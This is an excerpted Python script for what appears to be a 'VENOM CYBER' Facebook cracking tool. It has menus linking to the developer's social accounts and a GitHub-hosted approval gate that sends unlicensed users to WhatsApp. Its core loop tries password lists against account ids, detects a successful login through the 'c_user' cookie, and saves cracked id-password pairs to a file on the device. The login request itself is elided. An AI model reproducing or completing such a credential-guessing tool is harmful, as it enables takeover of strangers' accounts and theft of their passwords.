...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; VENOM CYBER\x07')
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m DEVELOPER : MR Venom
 \033[1;31m[\033[1;32m[--]\033[1;31m]\033[1;32m DEVELOPER : Me 👀
 \033[1;31m[\033[1;32m[U]\033[1;31m]\033[1;32m FACEBOOK  : Sujoy
 \033[1;31m[\033[1;32m[J]\033[1;31m]\033[1;32m GITHUB    : Mrvenom01
 \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : RANDOM 
 \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-0.1]
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=Sujoy.name.of.brand');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801946063621');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/groups/1481801635989260/?ref=share');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/Mrvenom01');time.sleep(1)
		admin()
	if bal =='0':
		Main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [VENOM-OK🖤] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/Mr-Venom-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Mrvenom01/Approval/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"Hello ,I am Mr VENOM VAI er  ROBOT and my boss is Venom.Sir this tool is Private because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/8801946063621")
        superuser()        
superuser()
